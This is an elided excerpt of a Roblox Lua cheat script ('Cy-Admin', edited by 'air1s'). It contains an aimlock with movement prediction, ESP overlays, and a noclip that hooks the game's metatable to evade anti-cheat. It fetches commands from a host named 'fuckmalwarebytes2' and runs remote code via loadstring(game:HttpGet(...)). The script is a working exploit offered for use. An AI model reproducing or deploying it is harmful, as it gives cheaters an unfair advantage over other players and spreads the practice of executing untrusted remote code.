...
local DamageIndicatorDebounce = true
...
local NormalHH = 0
local SpamDelay = 1
local AimbotVelocity = 7
local NewPredictionVelocity = 7
...
local BulletColour = ColorSequence.new(Color3.fromRGB(93,37,209))
local EspColour = Color3.fromRGB(93,37,209)
...
local function GetData()
	return HttpService:JSONDecode(game:HttpGet("https://fuckmalwarebytes2.000webhostapp.com/Commands.json"))
end
...
local TargetPart = AimlockTarget.FindFirstChild(AimlockTarget,'RealHumanoidRootPart') or AimlockTarget.FindFirstChild(AimlockTarget,'Torso')
	...
	elseif TargetPart and AimMode == "Prediction" then
		CFrameToReturn = (TargetPart.CFrame + TargetPart.Velocity / (PlayersPing < 2.3 or 4.3 or 6.3)) + (TargetPart.RotVelocity / (PlayersPing < 2.3 or 4.3 or 6.3))
	...
	if not Character:FindFirstChildOfClass'Tool' and AimlockMode == "LeftClick" and Key.UserInputType == Enum.UserInputType.MouseButton1 or AimlockMode == "RightClick" and Key.UserInputType == Enum.UserInputType.MouseButton2 then 
		if Target and Target.Parent then 
			...
			if TargetNew ~= Character and TargetNew ~= AimlockTarget and Aimlock then 
				...
				notif("AimlockTarget","your about to beam "..AimlockTarget.Name,5,nil)
			end
		end
	end
...
coroutine.resume(coroutine.create(function()
	...
	RainbowLabel.BackgroundTransparency = 0
	RainbowLabel.BorderColor3 = Color3.fromRGB(0,128,255)
	...
	RainbowLabel.TextColor3 = Color3.fromRGB(0,128,255)
	RainbowLabel.TextSize = 50

	RainbowScrolling.BackgroundColor3 = Color3.fromRGB(0,0,0)
	RainbowScrolling.BackgroundTransparency = 0
	RainbowScrolling.BorderColor3 = Color3.fromRGB(0,128,255)
	...
	CmdsFrame.BorderColor3 = Color3.fromRGB(0,128,255)
	...
	CmdsLabel.BackgroundTransparency = 0
	CmdsLabel.BorderColor3 = Color3.fromRGB(0,128,255)
	...
	CmdsLabel.Text = "air1s#0458"
	CmdsLabel.TextColor3 = Color3.fromRGB(0,128,255)
	CmdsLabel.TextSize = 20
	
	CmdsScrolling.Active = true
	CmdsScrolling.BackgroundColor3 = Color3.fromRGB(0,0,0)
	CmdsScrolling.BackgroundTransparency = 0
	CmdsScrolling.BorderColor3 = Color3.fromRGB(0,128,255)
	...
	CmdBarFrame.BorderColor3 = Color3.fromRGB(0,128,255)
	...
	CmdBarTextBox.BorderColor3 = Color3.fromRGB(0,128,255)
	...
	CmdBarTextBox.TextColor3 = Color3.fromRGB(0,128,255)
	...
	ValuesFrame.BackgroundTransparency = 0
	...
	ValuesTextLabel.BackgroundTransparency = 0
	ValuesTextLabel.BorderColor3 = Color3.fromRGB(0,128,255)
	ValuesTextLabel.Position = UDim2.new(0,0,0,0)
	ValuesTextLabel.Size = UDim2.new(0,160,0,160)
	ValuesTextLabel.Font = Enum.Font.Code
	ValuesTextLabel.TextColor3 = Color3.fromRGB(0,128,255)
	...
	HotkeysFrame.BackgroundTransparency = 0
	...
	HotkeysTextLabel.BackgroundTransparency = 0
	HotkeysTextLabel.BorderColor3 = Color3.fromRGB(0,128,255)
	HotkeysTextLabel.Position = UDim2.new(0,0,0,0)
	HotkeysTextLabel.Text = "air1s and 223 on top son"
	HotkeysTextLabel.Size = UDim2.new(0,160,0,160)
	HotkeysTextLabel.Font = Enum.Font.Code
	HotkeysTextLabel.TextColor3 = Color3.fromRGB(0,128,255)
	...
	KeysFrame.BackgroundTransparency = 0
	KeysFrame.BorderColor3 = Color3.fromRGB(0,128,255)
	...
	AnyCmdButton.BackgroundTransparency = 0
	AnyCmdButton.BorderColor3 = Color3.fromRGB(0,128,255)
	AnyCmdButton.Position = UDim2.new(0.17,0,0.43,0)
	AnyCmdButton.Size = UDim2.new(0,49,0,49)
	AnyCmdButton.Font = Enum.Font.SourceSans
	AnyCmdButton.TextColor3 = Color3.fromRGB(0,128,255)
	...
	KeysLabel.BorderColor3 = Color3.fromRGB(0,128,255)
	...
	KeysLabel.TextColor3 = Color3.fromRGB(0,128,255)
	KeysLabel.TextSize = 50
	
	CmdBarKeyLabel.BackgroundColor3 = Color3.fromRGB(0,0,0)
	CmdBarKeyLabel.BackgroundTransparency = 0
	CmdBarKeyLabel.BorderColor3 = Color3.fromRGB(0,128,255)
	...
	CmdBarKeyLabel.TextColor3 = Color3.fromRGB(0,128,255)
	CmdBarKeyLabel.TextSize = 11
	CmdBarKeyLabel.TextWrapped = true
	
	CmdBarKeyButton.BackgroundColor3 = Color3.fromRGB(0,0,0)
	CmdBarKeyButton.BackgroundTransparency = 0
	CmdBarKeyButton.BorderColor3 = Color3.fromRGB(0,128,255)
...
coroutine.resume(coroutine.create(function()
	while wait(1) do
		if CmdBarKey == "Quote" then 
			HotkeysTextLabel.Text = "AIR1S CYRUS: '".."\nGunStomp: E"
		else
			HotkeysTextLabel.Text = "AIR1S CYRUS: "..CmdBarKey.."\nGunStomp: E"
		end
				...
				if Player ~= LP and Player.Character and Player.Character:FindFirstChild'Head' then 
					if Player.Character:FindFirstChild'Humanoid' and Player.Character:findFirstChild'Right Arm' then 
						if ExploitDetectionPlayerTablePositions[Player.Name] then
							...
							if not Player.Character.Head:FindFirstChildOfClass'BillboardGui' and Player.Character.Humanoid.Health > 0 and not Player.Character:FindFirstChild('Bone',true) and not Player.Character:FindFirstChildOfClass'ForceField' then 
								if (Vector3.new(Pos1.X,0,0) - Vector3.new(Pos2.X,0,0)).magnitude >= 85 or (Vector3.new(0,0,Pos1.Z) - Vector3.new(0,0,Pos2.Z)).magnitude >= 85 then
									Esp(Player.Character.Head,"Exploiter: "..Player.Name.." Reason: moved too fast",Color3.fromRGB(93,37,203))
						...
						if not Player.Character.Head:FindFirstChildOfClass'BillboardGui' and Player.Character:FindFirstChildOfClass'Tool' then
							Esp(Player.character.Head,"Exploiter: "..Player.Name.." Reason: Feloop/Anti Feloop",Color3.fromRGB(93,37,203))
						end 
					end
				end
			end
...
coroutine.resume(coroutine.create(function()
	...
	Players:Chat("YOU CANT BEAT AIR1S SON") -- new admin
	Players:Chat("air1s runs u lil man") -- legacy admin
-- [[ End ]] --

notif("Cy-Admin","took " .. string.format("%.6f",tick()-Tick) .. " seconds",10,"rbxassetid://2474242690")
notif("edited by air1s","Creds to bm and jake for help (mainly bm since this is a edit of his)",10,nil)
...
local NoClip, NoClipKey = true, "x" -- change 'x' to whatever you want
setreadonly(Rm, false)
loadstring(game:HttpGet("https://raw.githubusercontent.com/zxciaz/Universal-Scripts/main/Notification%20Function", true))()
Notify("BM's seperate noclip (credits to him)", "Press F9 for Directions", "", 4);
warn("NoClip + made by BM (F1 FOR AIR1S LOCK)");
...
Rm.__newindex = newcclosure(function(self, Meme, Value)
    ...
    if tostring(self) == "HumanoidRootPart" or tostring(self) == "Torso" then 
        if Meme == "CFrame" and self:IsDescendantOf(LocalP.Character) then 
            return true -- Credits to grovestreett for this
        end
    end
...
Mouse.KeyDown:Connect(function(Key)
    if Key == NoClipKey then 
        NoClip = not NoClip
        Notify("now u can be a lil skid and noclip LOL!", "NoClip: "..tostring(NoClip), "", 3)
    end
end)
        ...
        if game.Players.LocalPlayer.Character.Humanoid:findFirstChild("Bullet") then
            ...
            if game.Players.LocalPlayer.Character.Humanoid.Bullet:findFirstChild("Trail") then
                ...
                if game.Players.LocalPlayer.Character.Humanoid:findFirstChild("Bullet"):findFirstChild("Trail").Lifetime < 10.00 then
                    print("success!")
                    game.Players.LocalPlayer.Character.Humanoid:findFirstChild("Bullet").Trail.Lifetime = 5.00
                    game.Players.LocalPlayer.Character.Humanoid:findFirstChild("Bullet").Trail.Transparency = NumberSequence.new(0)
                    game.Players.LocalPlayer.Character.Humanoid:findFirstChild("Bullet").Trail.Color = ColorSequence.new(Color3.fromRGB(93,37,203),Color3.fromRGB(93,37,203))
    ...
    if game.Players.LocalPlayer.Character.Humanoid then
        ...
        if game.Players.LocalPlayer.Character.Humanoid:findFirstChild("Bullet") then
            ...
            if game.Players.LocalPlayer.Character.Humanoid.Bullet:findFirstChild("Trail") then
                ...
                if game.Players.LocalPlayer.Character.Humanoid:findFirstChild("Bullet"):findFirstChild("Trail").Lifetime < 1.00 then
                    print("success!")
                    game.Players.LocalPlayer.Character.Humanoid:findFirstChild("Bullet").Trail.Lifetime = 1.00
                    game.Players.LocalPlayer.Character.Humanoid:findFirstChild("Bullet").Trail.Transparency = NumberSequence.new(0)
                    game.Players.LocalPlayer.Character.Humanoid:findFirstChild("Bullet").Trail.Color = ColorSequence.new(Color3.fromRGB(93,37,203),Color3.fromRGB(93,37,203))
                    game.Players.LocalPlayer.Character.Humanoid:findFirstChild("Bullet").Name = "BulletDone"
                end
